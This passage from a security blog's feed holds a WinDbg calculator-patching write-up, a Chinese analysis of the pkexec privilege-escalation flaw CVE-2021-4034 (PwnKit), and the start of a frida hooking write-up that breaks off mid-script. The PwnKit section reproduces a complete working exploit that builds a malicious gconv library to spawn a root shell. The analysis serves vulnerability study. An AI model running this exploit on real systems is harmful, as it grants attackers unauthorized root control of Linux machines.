data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403172531763.png" data-caption="image-20220403172531763"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403172531763.png" alt="image-20220403172531763"></a></p><p>It get called under this function. </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403172904998.png" data-caption="image-20220403172904998"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403172904998.png" alt="image-20220403172904998"></a></p><p>Until now, we have discovered a lot about the “+” and “&#x3D;” buttons, let’s move on to the static analysis part. </p><h2 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h2><p>Two important functions are: sub_140239270 and sub_140222AE0 do not have any sign to do the addition. Rather, sub_140239270 place space for both numbers we want to add. sub_140222AE0 returns an array with both pointers pointing to the numbers we want to add. </p><p>So the addition will appear in higher level functions. </p><p>What’s more, sub_140222AE0 was found always to be called in pairs. It is reasonable to speculate that other functions are likely to be other operators (addition, subtraction, multiplication, division, …, etc)</p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220417165207231.png" data-caption="image-20220417165207231"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220417165207231.png" alt="image-20220417165207231"></a></p><p>The caller function of sub_140222AE0.  </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220417165724038.png" data-caption="image-20220417165724038"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220417165724038.png" alt="image-20220417165724038"></a></p><p>Just after two sub_140222AE0 function calls, sub_140233050 do the addition. It updates the pointer in the v13, which stores the new value after the addition. With this information, the challenge will be solved soon. </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220417173049009.png" data-caption="image-20220417173049009"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220417173049009.png" alt="image-20220417173049009"></a></p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><p>Originally will use frida to hook the function, but it has some bug when attach to the UWP calculator. So I decide to use windbg scripting instead. </p><p>After search for the windbg scripting, the search results shows that windbg can be script using JavaScript files. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dx Debugger.State.Scripts.EXP.Contents.EXP(2)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initializeScript</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    host.<span class="property">diagnostics</span>.<span class="title function_">debugLog</span>(<span class="string">&quot;EXP is ready!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">EXP</span>(<span class="params">num</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> ctl = host.<span class="property">namespace</span>.<span class="property">Debugger</span>.<span class="property">Utility</span>.<span class="property">Control</span>;</span><br><span class="line">    host.<span class="property">diagnostics</span>.<span class="title function_">debugLog</span>(<span class="string">&quot;Setting up EXP!\n&quot;</span>);</span><br><span class="line">    ctl.<span class="title class_">ExecuteCommand</span>(<span class="string">&quot;bp Calculator!VSDesignerDllMain+0xda1ac&quot;</span>);</span><br><span class="line">    ctl.<span class="title class_">ExecuteCommand</span>(<span class="string">&quot;g&quot;</span>);</span><br><span class="line">    ctl.<span class="title class_">ExecuteCommand</span>(<span class="string">&quot;eb qwo(@rsi)+0xc 0x3&quot;</span>);</span><br><span class="line">    ctl.<span class="title class_">ExecuteCommand</span>(<span class="string">&quot;bd 0&quot;</span>);</span><br><span class="line">    ctl.<span class="title class_">ExecuteCommand</span>(<span class="string">&quot;g&quot;</span>);</span><br><span class="line">    host.<span class="property">diagnostics</span>.<span class="title function_">debugLog</span>(<span class="string">&quot;Finished!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Achievement-display"><a href="#Achievement-display" class="headerlink" title="Achievement display"></a>Achievement display</h2><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/ezgif-1-4818e84a2a.gif" data-caption="Source image"><img src="/2022/04/17/Win10-UWP-Calculator/assets/ezgif-1-4818e84a2a.gif" alt="Source image"></a></p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p>Atum</p><p>Tencent Spark Program</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://bbs.pediy.com/thread-246657-1.htm">【原创】去一个小广告-软件逆向-看雪论坛-安全社区</a></p><p><a href="http://showlinkroom.me/2017/05/31/UWP%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A5%E8%A7%A6/">UWP逆向初接触 | l1nk3dHouse (showlinkroom.me)</a></p><p><a href="https://blog.walterlv.com/post/create-uwp-app-from-zero-0.html">(1&#x2F;2) 为了理解 UWP 的启动流程，我从零开始创建了一个 UWP 程序 - walterlv</a></p><p><a href="https://blog.walterlv.com/post/create-uwp-app-from-zero-1.html">(2&#x2F;2) 为了理解 UWP 的启动流程，我从零开始创建了一个 UWP 程序 - walterlv</a></p><p><a href="https://github.com/NaniteFactory/hookwin10calc">NaniteFactory&#x2F;hookwin10calc: Reverse engineered Windows 10 Calculator.exe (UWP application) hacker. 한글&#x2F;漢文을 배운 윈도우 계산기 패치. (github.com)</a></p><p><a href="https://en.wikipedia.org/wiki/Universal_Windows_Platform">Universal Windows Platform - Wikipedia</a></p><p><a href="https://blog.mattjustice.com/2018/08/24/gdb-for-windbg-users/">GDB commands for WinDbg users | Matthew Justice’s blog (mattjustice.com)</a></p><p><a href="http://windbg.info/doc/1-common-cmds.html">Common WinDbg Commands (Thematically Grouped)</a></p><hr><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/s--search-memory-">s (Search Memory) - Windows drivers | Microsoft Docs</a></p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/ba--break-on-access-">ba (Break on Access) - Windows drivers | Microsoft Docs</a></p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/e--ea--eb--ed--ed--ef--ep--eq--eu--ew--eza--ezu--enter-values-">e, ea, eb, ed, eD, ef, ep, eq, eu, ew, eza (Enter Values) - Windows drivers | Microsoft Docs</a></p><p><a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling convention | Microsoft Docs</a></p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/masm-numbers-and-operators?redirectedfrom=MSDN">MASM Numbers and Operators - Windows drivers | Microsoft Docs</a></p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/javascript-debugger-scripting">JavaScript Debugger Scripting - Windows drivers | Microsoft Docs</a></p>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-4034</title>
      <link href="/2022/01/27/CVE-2021-4034/"/>
      <url>/2022/01/27/CVE-2021-4034/</url>
      
        <content type="html"><![CDATA[<p>漏洞原文来自 <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">Qualys Security Blog</a> </p><p>PoC1 来自 <a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p>PoC2 来自 <a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Polkit 是用于在类 Unix 操作系统中控制系统范围特权的组件。它为非特权进程提供了与特权进程进行通信的有组织的方式。</p><p>Polkit 的 pkexec 存在本地权限提升漏洞，已获得普通权限的攻击者可通过此漏洞获取root权限。</p><p>该漏洞CVSS评分：7.8，危害等级：高危</p><p>漏洞利用难度低，最早引入问题的 commit 来自 2009 年，影响版本范围远超去年的 sudo 漏洞。</p><p>漏洞作者在 Ubuntu、Debian、Fedora 和 CentOS 的默认安装环境上均测试通过。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>由于Polkit为系统预装工具，所有主流Linux版本均受影响</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>pkexec为polkit其中的一个组件，允许用户以另一个用户身份执行命令，其使用有点类似于sudo。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pkexec</span><br><span class="line">pkexec --version |</span><br><span class="line">       --<span class="built_in">help</span> |</span><br><span class="line">       --disable-internal-agent |</span><br><span class="line">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class="line"></span><br><span class="line">See the pkexec manual page <span class="keyword">for</span> more details.</span><br></pre></td></tr></table></figure><p>因此其权限具有SUID，在执行时程序拥有文件所有者权限，也就是root。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ll /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec*</span><br></pre></td></tr></table></figure><p>首先对其还未修复的代码进行审计，这里选用<a href="https://github.com/wingo/polkit/blob/master/src/programs/pkexec.c">尚未更新的源码</a>进行分析。在main函数中，在533-567行处理命令行参数，for 循环从下标 1 开始遍历 argv[]。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    path = g_strdup (argv[n]);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s = g_find_program_in_path (path);</span><br><span class="line">        ...</span><br><span class="line">        argv[n] = path = s;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (clearenv () != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      g_printerr (<span class="string">&quot;Error clearing environment: %s\n&quot;</span>, g_strerror (errno));</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/2022/01/27/CVE-2021-4034/assets/image-20220127202308142.png" data-caption="image-20220127202308142"><img src="/2022/01/27/CVE-2021-4034/assets/image-20220127202308142.png" alt="image-20220127202308142"></a></p><p>然后在610行开始，会获取PROGRAM参数名称，也就是需要执行的程序。</p><p><a data-fancybox="gallery" data-src="/2022/01/27/CVE-2021-4034/assets/image-20220127202452874.png" data-caption="image-20220127202452874"><img src="/2022/01/27/CVE-2021-4034/assets/image-20220127202452874.png" alt="image-20220127202452874"></a></p><p>而问题就出现在这<code>n=1</code>上，当执行pkexec不传递任何参数时将会发生：</p><ol><li>在第 534 行，整数 n 永久设置为 1</li><li>在第 610 行，从 argv[1] 越界读取指针路径</li><li>在第 639 行，指针 s 被越界写入 argv[1]</li></ol><p>但巧合的是，当执行程序时，内核会将参数，环境字符串和指针（argv 和 envp）复制到新程序堆栈的末尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------| </span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | </span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| </span><br></pre></td></tr></table></figure><p>如此看来，当越界读写argv[1]时，实际上读写的是envp[0]的值。</p><ol><li>假设我们执行pkexec，此时<code>argc=0</code>，<code>envp=&#123;&quot;xxx&quot;&#125;</code></li><li>610行，程序会读取argv[1]到path变量中，也就是”xxx”</li><li>632行，<code>s = g_find_program_in_path (path)</code>找到该程序的绝对路径，假设为&#x2F;usr&#x2F;bin&#x2F;xxx</li><li>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp也就变成了<code>&#123;&quot;/usr/bin/xxx&quot;&#125;</code></li></ol><p>如果把环境变量稍加更改，当<code>envp=&#123;&quot;PATH=folder_name=.&quot;&#125;</code>，在folder目录中放置一个可执行文件<code>lol</code>，最后在越界读写后<code>envp[0]</code>将会变成<code>folder_name=./lol</code>。</p><p>因此，这种越界读写会将一个新的不安全的环境变量引入pkexec的环境中（执行前所做的过滤将功亏一篑）</p><p>但是，程序的本身还是十分看中安全问题的，在701行程序会清除所有环境变量。也就是说，所有的漏洞利用需要在701行之前完成（不要想着LD_PRELOAD啦）。</p><p><a data-fancybox="gallery" data-src="/2022/01/27/CVE-2021-4034/assets/image-20220127204623040.png" data-caption="image-20220127204623040"><img src="/2022/01/27/CVE-2021-4034/assets/image-20220127204623040.png" alt="image-20220127204623040"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在pkexec中多次使用了g_printerr()函数，该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。</p><p>iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。</p><p>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p><p>具体的利用过程如下：</p><ol><li>首先一个gconv-modules配置文件，放置在.&#x2F;xxx目录下，其内容指向一个准备好的恶意so文件。</li><li>创建可执行文件xxx，放置在.&#x2F;GCONV_PATH&#x3D;.目录下，注意目录名称为<code>GCONV_PATH=.</code></li><li>然后调用pkexec，argc&#x3D;0，envp&#x3D;<code>&#123;&quot;xxx&quot;,&quot;PATH=GCONV_PATH=.&quot;,&quot;LC_MESSAGES=en_US.UTF-8&quot;&#125;</code></li><li>pkexec执行到610行，path&#x3D;xxx</li><li>pkexec执行到632行，找到xxx的具体位置，因为我们制定了环境变量<code>PATH=GCONV_PATH=.</code>，所以会找到xxx的具体位置为<code>GCONV_PATH=./xxx</code></li><li>pkexec执行到636行，envp[0] &#x3D; argv[1] &#x3D; path&#x3D; <code>GCONV_PATH=./xxx</code>，此时envp为<code>&#123;&quot;GCONV_PATH=./xxx&quot;,&quot;PATH=GCONV_PATH=.&quot;,&quot;LC_MESSAGES=en_US.UTF-8&quot;&#125;</code></li><li>pkexec执行到643行，调用g_printerr，从而调用iconv_open()函数，找到gconv-modules配置文件：.&#x2F;xxx&#x2F;gconv-modules，然后找到so文件，最终执行so文件。</li></ol><p>我们只要在so文件的gonv_init()函数中，执行<code>/bin/sh</code>即可拿到一个root权限的shell。</p><p>EXP展示（来自PoC2）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;</span></span><br><span class="line"><span class="comment"> * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *shell = </span><br><span class="line"><span class="string">&quot;#include &lt;stdio.h&gt;\n&quot;</span></span><br><span class="line"><span class="string">&quot;#include &lt;stdlib.h&gt;\n&quot;</span></span><br><span class="line"><span class="string">&quot;#include &lt;unistd.h&gt;\n\n&quot;</span></span><br><span class="line"><span class="string">&quot;void gconv() &#123;&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;void gconv_init() &#123;\n&quot;</span></span><br><span class="line"><span class="string">&quot;setuid(0); setgid(0);\n&quot;</span></span><br><span class="line"><span class="string">&quot;seteuid(0); setegid(0);\n&quot;</span></span><br><span class="line"><span class="string">&quot;system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh\&quot;);\n&quot;</span></span><br><span class="line"><span class="string">&quot;exit(0);\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">FILE *fp;</span><br><span class="line">system(<span class="string">&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;</span>);</span><br><span class="line">fp = fopen(<span class="string">&quot;pwnkit/pwnkit.c&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">&quot;%s&quot;</span>, shell);</span><br><span class="line">fclose(fp);</span><br><span class="line">system(<span class="string">&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;</span>);</span><br><span class="line"><span class="type">char</span> *env[] = &#123; <span class="string">&quot;pwnkit&quot;</span>, <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>, <span class="string">&quot;CHARSET=PWNKIT&quot;</span>, <span class="string">&quot;SHELL=pwnkit&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, (<span class="type">char</span>*[])&#123;<span class="literal">NULL</span>&#125;, env);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://saucer-man.com/information_security/876.html">https://saucer-man.com/information_security/876.html</a></p><p><a href="https://mp.weixin.qq.com/s/3rnkcRfX_BxzlVzp0stQRw">https://mp.weixin.qq.com/s/3rnkcRfX_BxzlVzp0stQRw</a></p><p>感谢swing师傅的指导</p>]]></content>
      
      
      <categories>
          
          <category> CVE Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-4034 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win32 Calculator</title>
      <link href="/2022/01/07/win32-Calculator/"/>
      <url>/2022/01/07/win32-Calculator/</url>
      
        <content type="html"><![CDATA[<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p>difficulty: medium<br>type: basic<br>make the calulator in your system 1+1&#x3D;3.</p><h2 id="Skills"><a href="#Skills" class="headerlink" title="Skills"></a>Skills</h2><p>Reverse Engineering<br>Hooking<br>Tracing<br>Debugging</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>Disasmbler + Decompiler : IDA Pro&#x2F;Ghidra<br>Debugger: windbg&#x2F;ollydbg&#x2F;gdb<br>Tracer&#x2F;hook: frida</p><h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>frida hook<br>ida pro</p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><p>采用的是Win7的 win32calc.exe 作为逆向对象，没有采用Win10自带计算器主要是因为它的可执行文件和进程文件不是一个，不太好进行静态分析（不知道怎么进行操作）。Win10计算器已经开源：<a href="https://github.com/microsoft/calculator">https://github.com/microsoft/calculator</a></p><h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>用管理员权限打开IDA，直接在System32文件夹下打开win32calc.exe文件进行静态分析（管理员权限为了后期能够动态调试，纯静态调试可以把exe文件复制到工作目录）。IDA会自动从Microsoft官方地址下载相关的Symbol Table，所以在逆向这个文件时大部分函数都是有名字的，大大加速了逆向进度，同时也抛出疑问：</p><blockquote><p>  如果计算器没有符号(这个时候函数名都无了)，该怎样搞？</p></blockquote><p>对着函数列表一通找，由于命名足够合理，很容易猜测函数的目的是什么，并且还有相关前缀，例如<code>CCalcEngine</code>，<code>CCalcHistory</code>，<code>CcalculatorController</code>等。现在就需要开始想一想要完成1+1&#x3D;3这个任务的条件是什么了。当按下1+1&#x3D;这几个按键时会调用很多不同的函数（在动态调试的时候稍微留意了一下），比如接受按键类型的函数，运算函数，运算结果显示函数。在一整条调用链里的任何一个地方都可以进行修改。</p><p>是在一开始过滤了其他不相关函数直接留下了<code>DoOperation</code>函数，猜测可能存在运算。在F5反汇编后一系列的过滤和调用更加证实了猜想很可能是正确的。</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/image-20220109120553100.png" data-caption="image-20220109120553100"><img src="/2022/01/07/win32-Calculator/assets/image-20220109120553100.png" alt="image-20220109120553100"></a></p><h3 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h3><p>在函数开头位置下断点，用IDA内选择Windbg动态调试计算器，结果果然像之前猜想的那样停在了断点处。说明这个函数确实是在调用链之中。</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/image-20220109121215992-16502356803191.png" data-caption="image-20220109121215992"><img src="/2022/01/07/win32-Calculator/assets/image-20220109121215992-16502356803191.png" alt="image-20220109121215992"></a></p><p>之后进行单步调试，看看在函数内部发生了什么。在过完一系列的if-else之后调用了一个叫<code>addrat</code>的函数（看起来就很像加法函数Doge）。F7进入函数内部瞧瞧发现它调用了<code>addnum</code>函数，<code>addnum</code>函数调用了<code>_addnum</code>函数，这更像加法函数了！多调试几次可以发现如果使用乘法会调用<code>mulrat</code>函数，以此类推。由此可以大概猜测函数调用链如下：</p><p>按下等号–&gt;调用<code>DoOperation</code>确定算数方法和内容–&gt;调用相关算数函数–&gt;给系统做交互最终显示在屏幕上。</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/image-20220109121358078.png" data-caption="image-20220109121358078"><img src="/2022/01/07/win32-Calculator/assets/image-20220109121358078.png" alt="image-20220109121358078"></a></p><p>既然DoOperation函如其名，那么需要计算的数字肯定通过传参或者某种方式传了进去。在一开始下断点的位置函数刚刚开始运行，猜测传参可能是和需要计算的值相关。传参有三个，int，**（指针的指针），*（指针）。</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/image-20220109141132268.png" data-caption="image-20220109141132268"><img src="/2022/01/07/win32-Calculator/assets/image-20220109141132268.png" alt="image-20220109141132268"></a></p><p>经过多次测试，发现int是个常数，不管输入数值如何都是不会变的。因此直接去内存中找这两个指针所指的地址。如图所示为参数a4所指的值，右边8byte的区域就是输入计算的数值了，完成任务只需要去篡改内存即可。</p><p>关于这里为什么指针指的是前面部分而不是直接指向数值（一开始还找了好久找不到输入的数字去哪了），猜测可能是计算器支持多种计算方式还有科学计数法，用其他的一些方式表示数字。</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/image-20220109141437411.png" data-caption="image-20220109141437411"><img src="/2022/01/07/win32-Calculator/assets/image-20220109141437411.png" alt="image-20220109141437411"></a></p><h3 id="Hooking"><a href="#Hooking" class="headerlink" title="Hooking"></a>Hooking</h3><p>了解了函数调用链后便可以用frida-trace去hook关键的DoOperation函数了，位置就选在Debugging时下断点的地方，算好偏移地址，启动计算器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; frida<span class="literal">-trace</span> <span class="operator">-f</span> C:\Windows\System32\win32calc.exe <span class="literal">--decorate</span> <span class="literal">-a</span> <span class="string">&quot;win32calc.exe!0x4753c&quot;</span></span><br></pre></td></tr></table></figure><p>frida-trace不会中断程序运行，但是在终端可以看到打印一行字。每当按下&#x3D;号进行运算时，终端就会打印，说明位置应该是没有问题的。</p><p><a data-fancybox="gallery" data-src="/2022/01/07/win32-Calculator/assets/image-20220109122803673.png" data-caption="image-20220109122803673"><img src="/2022/01/07/win32-Calculator/assets/image-20220109122803673.png" alt="image-20220109122803673"></a></p><p>frida-trace会在当前文件夹下生成<code>__handlers__</code>文件夹，里面储存着需要hook函数的js文件，更改此文件中的内容即可对函数进行操作。像之前说的，直接篡改相应的内存地址即可。这里直接拿出最终exp（注释内容为调试所需，dump内存之类的）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onEnter</span>(<span class="params">log, args, state</span>) &#123;</span><br><span class="line">    <span class="comment">// frida-trace -f C:\Windows\System32\win32calc.exe --decorate -a &quot;win32calc.exe!0x4753c&quot;</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;sub_4753c() [win32calc.exe]&#x27;</span>);</span><br><span class="line">    <span class="comment">// **R8, *R9</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">R8</span> = <span class="title function_">ptr</span>(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">R9</span> = <span class="title function_">ptr</span>(args[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// log(R8);</span></span><br><span class="line">    <span class="comment">// log(R9);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> oldValR9 = <span class="variable constant_">R9</span>.<span class="title function_">readPointer</span>().<span class="title function_">add</span>(<span class="string">&quot;0xc&quot;</span>);</span><br><span class="line">    <span class="comment">// log(oldValR9);</span></span><br><span class="line">    <span class="comment">// log(hexdump(oldValR9, &#123;</span></span><br><span class="line">    <span class="comment">// offset: 0,</span></span><br><span class="line">    <span class="comment">// length: 32,</span></span><br><span class="line">    <span class="comment">// header: true,</span></span><br><span class="line">    <span class="comment">// ansi: true</span></span><br><span class="line">    <span class="comment">// &#125;)); </span></span><br><span class="line"></span><br><span 